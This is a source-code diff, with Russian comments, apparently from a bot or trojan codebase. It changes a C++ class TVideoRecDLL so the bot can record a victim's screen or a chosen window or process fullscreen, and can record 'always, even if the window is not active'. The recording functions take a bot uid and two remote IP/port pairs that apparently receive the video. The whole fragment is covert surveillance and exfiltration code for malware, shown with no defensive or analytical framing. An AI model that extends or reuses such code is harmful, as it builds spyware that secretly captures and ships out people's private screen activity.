@@ -31,9 +31,13 @@ const DWORD VIDEORECORD_DEFAULT_PORT = 700;
 class TVideoRecDLL : public TBotObject
 {
 private:
+
+	static const int VIDEO_FULLSCREEN	= 0x0001; //полноэкранная запись
+	static const int VIDEO_ALWAYS		= 0x0002; //записывать всегда, даже если окно не активно
+
 	// определяем типы функци1
-	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds ) ;
-	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds );
+	typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags ) ;
+	typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags );
 	typedef VOID (WINAPI *TStopRec		)();
 	typedef VOID (WINAPI *TResetTimer	)();
 
